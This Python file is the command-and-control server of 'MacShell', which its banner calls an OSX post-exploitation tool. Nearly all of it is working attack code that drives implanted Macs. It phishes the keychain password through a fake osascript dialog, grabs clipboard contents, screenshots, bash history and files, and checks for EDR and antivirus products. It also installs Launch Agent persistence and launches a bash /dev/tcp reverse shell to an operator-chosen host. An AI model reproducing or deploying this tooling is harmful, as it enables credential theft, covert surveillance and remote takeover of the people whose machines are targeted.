import socket
import os
from threading import Thread 
from queue import Queue
import ssl
import sys
import subprocess

##first set up ssl for this server to properly run on ssl:
##1. openssl req -new -newkey rsa:1024 -nodes -out ca.csr -keyout ca.key
##2. openssl x509 -trustout -signkey ca.key -days 365 -req -in ca.csr -out ca.pem
##
##3. reference ca.pem and ca.key in the "context.load_cert_chain setting below in the start_server() function
##4. can also set up iptables on the server to restrict source connections from certain ranges:
##iptables -A INPUT -i eth1 -m iprange --src-range x.x.x.x-x.x.x.x -j ACCEPT
##iptables -P INPUT DROP



print("<\033[33m-----------------------------------------------------------------\033[0m>")
print("*            __  __            ____  _          _ _               *")
print("*           |  \/  | __ _  ___/ ___|| |__   ___| | |              *")
print("*           | |\/| |/ _` |/ __\___ \| '_ \ / _ \ | |              *")
print("*           | |  | | (_| | (__ ___) | | | |  __/ | |              *")
print("*           |_|  |_|\__,_|\___|____/|_| |_|\___|_|_|              *")
print('*                                                                 *')
print('*                                                                 *')
print("*                              _.---._                            *")
print("*                          .'\"\".'/|\`.\"\"'.                        *")
print("*                         :  .' / | \ `.  :                       *")
print("*                         '.'  /  |  \  `.'                       *")
print("*                          `. /   |   \ .'                        *")
print("*                            `-.__|__.-'                          *")
print('*                                                                 *')
print('*                                                                 *')
print("* \033[92mOSX Post Exploitation Tool\033[0m                                      *")
print("* \033[92mauthor: @cedowens)\033[0m                                              *")
print("<\033[33m-----------------------------------------------------------------\033[0m>")


class ClientThread(Thread): 
 
    def __init__(self,ip,port,connection,session,srvport): 
        Thread.__init__(self) 
        self.ip = ip 
        self.port = port
        print("[+] \033[92m[SESSION %s]: Connection received from %s:%s\033[0m" % (str(session),str(ip),str(port)))

        while True:
            command = input("\033[34m[SESSION %s: %s]>>>\033[0m " % (str(session),str(ip)))
            if 'help' in command:
                print("-"*100)
                print("\033[33mHelp menu:\033[0m")
                print("--->ALIASES<---")
                print(">\033[33msysteminfo\033[0m: Return useful system information")
                print(">\033[33mcd [directory]\033[0m: cd to the directory specified (ex: cd /home)")
                print(">\033[33mlist\033[0m: list files and directories")
                print(">\033[33mdownload [filename]\033[0m: after you cd to directory of interest, download files of interest (one at a time)")
                print(">\033[33musers\033[0m: List users")
                print(">\033[33maddresses\033[0m: List internal address(es) for this host")
                print(">\033[33mlcwd: Show current server working directory")
                print('')
                print("--->COMMANDS<---")
                print(">\033[33mprompt\033[0m: Propmpt the user to enter credentials")
                print(">\033[33msearchhist\033[0m: Grep for interesting hosts from bash history")
                print(">\033[33mclipboard\033[0m: Grab text in the user's clipboard")
                print(">\033[33mconnections\033[0m: Show active network connections")
                print(">\033[33mchecksecurity\033[0m: Search for common EDR/AV products")
                print(">\033[33mscreenshot\033[0m: Grap a screenshot of the OSX host")
                print(">\033[33mpersist\033[0m: Add persistence as OSX Launch Agent. NOTE: This command must be run in the same directory where the macshell client is running.")
                print(">\033[33mremove\033[0m: Remove the login persistence")
                print(">\033[33mshell [IP]:[port]\033[0m: Send a bash interactive reverse shell to IP:port (ex: shell 10.10.10.10:100)...NOTE: This is a separate process that is unencrypted!")
                print('')
                print("--->OTHER<---")
                print(">\033[33mIn general enter whatever Mac OS shell command you want to run. Ex: whoami, hostname, pwd, etc.\033[0m")
                print(">\033[33mexit\033[0m: Exit the session and stop the client")
                print("-"*100)
            
            
            elif 'exit' in command:
                print('Exiting now...')
                connection.send(command.encode('utf8'))
                y = connection.recv(2048)
                z = y.decode('utf8')
                print("----Server still listening on port %s----" % str(srvport))
                break
            elif 'shell' in command:
                x = command.split(':')
                ip = x[0].replace('shell ','')
                port = x[1]
                print('Launching reverse shell to %s:%s' % (str(ip),str(port)))
                ptycmd = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
                shellcommand = "bash -i>& /dev/tcp/%s/%s 0>&1 && %s" % (str(ip),str(port),ptycmd)
                connection.send(shellcommand.encode('utf8'))
            elif 'lcwd' in command:
                x = subprocess.getstatusoutput("pwd")
                print("Current server working directory:")
                print(str(x).replace("(0, '", '').replace("')",''))
            elif 'list' in command:
                x = 'ls -alrt'
                connection.send(x.encode('utf8'))
                data = connection.recv(8192)
                while True:
                    g = connection.recv(8192)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'connections' in command:
                x = "lsof -i | grep -E \"(LISTEN|ESTABLISHED)\""
                connection.send(x.encode('utf8'))
                data = connection.recv(8192)
                while True:
                    g = connection.recv(8192)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                print("Current network connections:")
                data2 = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'').replace("!EOF!",'')
                print("\033[92m%s" % str(data2))
            
            elif 'cd ' in command:
                connection.send(command.encode('utf8'))
                w = connection.recv(2048)
                z = w.decode('utf8').replace("(0, '", '').replace("')",'')
                if '/' in z:
                    print("\033[92m[+] Current directory changed to %s" % str(z))
                else:
                    print("Directory not found.")
            
            elif 'addresses' in command:
                x = "ifconfig | sed -En 's/10.10.10.10//;s/.*inet (addr:)?(([0-9]*\\.){3}[0-9]*).*/\\2/p'"
                connection.send(x.encode('utf8'))
                w = connection.recv(4096)
                print('IP address(es) found:')
                z = w.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'users' in command:
                x = "dscl . list /Users | grep -v '^_' | grep -v daemon | grep -v nobody | grep -v root"
                connection.send(x.encode('utf8'))
                w = connection.recv(2048)
                z = w.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'searchhist' in command:
                x = "cat ~/.bash_history | grep -E \"[0-9].[0-9].[0-9].[0-9]|ssh|scp|ftp|sftp|vnc\""
                connection.send(x.encode('utf8'))
                data = connection.recv(8192)
                while True:
                    g = connection.recv(8192)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'')
                print("\033[92mHisotry Info Found:\033[0m")
                print(str(z))
                
                
            elif 'screenshot' in command:
                x = 'screencapture -x -t jpg out.jpg'
                number = 1
                connection.send(x.encode('utf8'))
                data = connection.recv(8192)
                while True:
                    g = connection.recv(8192)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                file = 'screenshot.jpg'
                f = open("%s" % file, "wb")
                f.write(data)
                f.close()
                print('\033[92m[+] Screenshot saved to "screenshot.jpg" in server directory\033[0m')

            elif 'download ' in command:
                command2 = command.replace('download ', '')
                number = 1
                connection.send(command.encode('utf8'))
                data = connection.recv(8192)
                denied = bytes('Permission denied', encoding='utf-8')
                if denied in data:
                    print('\033[93m[-] This user does not have permissions to open %s' % str(command2))
                else:
                    while True:
                        g = connection.recv(8192)
                        end = bytes('!EOF!', encoding='utf-8')
                        if end in g:
                            break
                        data = data + g
                    
                    file = "%s" % str(command2)
                    f = open("%s" % file, "wb")
                    f.write(data)
                    f.close()
                    print('\033[93m[+] %s downloaded and saved to current server directory\033[0m' % str(command2))
        
            elif 'checksecurity' in command:
                connection.send(command.encode('utf8'))
                f = connection.recv(8192).decode('utf8').replace("(0, '", '').replace("')",'')

                if '/CbOsxSensorService' in str(f):
                    print('[+] \033[33mCarbon Black OSX Sensor installed\033[0m')
                
                if '/CbDefense' in str(f):
                    print('[+] \033[33mCarbon Black Defense A/V installed\033[0m')
                
                if ('/ESET' in str(f) or '/eset' in str(f)):
                    print('[+] \033[33mESET A/V installed\033[0m')
                
                if ('/Littlesnitch' in str(f) or 'Snitch' in str(f)):
                    print('[+] \033[33mLittle snitch firewall running\033[0m')
                
                if '/xagt' in str(f):
                    print('[+] \033[33mFireEye HX agent installed\033[0m')
                
                if '/falconctl' in str(f):
                    print('[+] \033[33mCrowdstrike Falcon agent installed\033[0m')

                if ('/GlobalProtect' in str(f) or '/PanGPS' in str(f)):
                    print('[+] \033[33mGlobal Protect PAN VPN client running\033[0m')

                if '/OpenDNS' in str(f):
                    print('[+] \033[33mOpenDNS Client running\033[0m')

                if '/HostChecker' in str(f):
                    print('[+] \033[33mPulse VPN client running\033[0m')
            
            elif 'persist' in command:
                connection.send(command.encode('utf8'))
                y = connection.recv(2048)
                z = y.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'remove' in command:
                connection.send(command.encode('utf8'))
                response = connection.recv(2048)
                z = response.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'prompt' in command:
                x = "osascript -e 'set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"Applications:Utilities:Keychain Access.app:Contents:Resources:AppIcon.icns\" with title \"Authentication Needed\" with hidden answer'"
                connection.send(x.encode('utf8'))
                w = connection.recv(8192)
                z = w.decode('utf8').replace("(0, '", '').replace("')", '')
                if 'text returned' in z:
                    y = z.replace('button returned:OK', '').replace(', ','').replace('text returned:','password entered: ')
                    print("\033[92m%s\033[0m" % str(y))
                else:
                    print("\033[92m%s\033[0m" % str(z))
            elif 'systeminfo' in command:
                x = "osascript -e 'return (system info)'"
                connection.send(x.encode('utf8'))
                w = connection.recv(8192)
                z = w.decode('utf8').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
            elif 'clipboard' in command:
                x = "osascript -e 'return (the clipboard)'"
                connection.send(x.encode('utf8'))
                data = connection.recv(15360)
                while True:
                    g = connection.recv(15360)
                    end = bytes('!EOF!', encoding='utf-8')
                    if end in g:
                        break
                    data = data + g
                if len(data) < 4096:
                    z = data.decode('utf8').replace("(0, '", '').replace("')",'')
                    print("\033[92m%s\033[0m" % str(z))
                else:
                    f = open('clipboard.txt','w')
                    f.write(data.decode('utf8').replace("(0, '", '').replace("')",''))
                    f.close()
                    print("\033[93m[+] Clipboard data written to 'clipboard.txt' in the current server directory.\033[0m")
            else:
                connection.send(command.encode('utf8'))
                data = connection.recv(15360)
                z = data.decode('utf8').replace("\\n", '\n').replace("(0, '", '').replace("')",'')
                print("\033[92m%s\033[0m" % str(z))
                
                if '80(admin)' in str(z):
                    print("Your user context likely has sudo rights (based on groups). To get sudo rights you will need the cleartext password.")
                    print("Once you have this, start a remote listener on the host of your choice and send a shell to that listener by typing: shell [IP]:[port]")
                    print("Lastly, once you have an interactive shell, type this into the shell prompt to get a full tty shell: python -c 'import pty; pty.spawn(\"/bin/sh\")'’")

            if not connection:
                break


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('ca.pem','ca.key')
host = '127.0.0.1' 
port = 443
srvport = port
session = 0
q = Queue()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
ssock = context.wrap_socket(s, server_side=True)

try:
    ssock.bind((host,port))
except:
    print("Bind failed. Error: %s" % (str(sys.exc_info)))
    sys.exit()
    
threads = [] 
print('')
print('===>Server listening on port %s<====' % str(port))
print('')


while True:
    ssock.listen(20)
    (connection, (ip,port)) = ssock.accept()
    canary = connection.recv(15).decode('utf8')
    
    if 'MacShellIzC00lz' in canary:
        q.put(connection)
        session = session + 1
        selector = session - 1
        conn = q.get(selector)
        newthread = ClientThread(ip,port,connection,session,srvport)
        threads.append(newthread)
        try:
            newthread.start()
        except:
            print("Thread did not start.")
            traceback.print_exc()
    else:
        connection.shutdown(1)
        connection.close()
     

 
for t in threads: 
    t.join()
